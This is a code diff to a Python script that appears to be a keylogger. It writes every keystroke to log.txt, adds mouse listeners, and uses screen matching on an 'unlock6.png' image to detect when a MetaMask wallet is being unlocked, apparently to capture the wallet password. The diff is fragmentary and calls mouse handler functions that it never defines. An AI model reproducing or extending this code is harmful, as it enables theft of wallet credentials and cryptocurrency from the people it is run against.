@@ -20,6 +20,10 @@ while True:
             keys.append(key)
             print("{0} pressed".format(key))
             
+        def no_click(x,y,button,pressed):
+            print('{0} at {1}'.format('Pressed' if pressed else 'Released',(x,y)))
+            if not pressed:
+                return False
 
         def write_file(keys):
             with open("log.txt", "a") as f:
@@ -28,11 +32,23 @@ while True:
                     f.write(k)
     
         def on_release(key):
+            #time.sleep(5)
             if(pyautogui.locateOnScreen('./img/unlock6.png')):
                 return False
         
         with Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()
+        with mouse.Listener(
+            on_move=on_move,
+            on_click=on_click,
+            on_scroll=on_scroll) as listener:
+            listener.join()
+        listener = mouse.Listener(
+            on_move=on_move,
+            on_click=on_click,
+            on_scroll=on_scroll)
+        listener.start()
+        
         
         if(pyautogui.locateOnScreen('./img/unlock6.png')):
             print('Login MetaMask')
